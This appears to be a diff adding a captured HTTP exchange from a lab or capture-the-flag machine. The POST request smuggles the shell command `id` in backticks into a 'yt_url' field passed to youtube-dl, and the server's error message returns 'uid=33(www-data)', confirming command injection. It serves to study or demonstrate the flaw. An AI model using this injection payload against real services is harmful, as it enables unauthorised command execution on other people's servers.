@@ -1,0 +1,51 @@
+POST / HTTP/1.1
+
+Host: 10.10.143.178
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Content-Length: 11
+
+Origin: http://10.10.143.178
+
+Connection: close
+
+Referer: http://10.10.143.178/
+
+
+
+yt_url=`id`
+
+
+
+
+=================================================================
+
+
+HTTP/1.1 200 OK
+
+Date: Sat, 26 Dec 2020 17:39:04 GMT
+
+Server: Apache/2.4.29 (Ubuntu)
+
+Vary: Accept-Encoding
+
+Content-Length: 406
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u'uid=33(www-data)' is not a valid URL. Set --default-search \"ytsearch\" (or run  youtube-dl \"ytsearch:uid=33(www-data)\" ) to search YouTube\n","url_orginal":"`id`","output":"","result_url":"\/tmp\/downloads\/5fe775383a427.mp3"}
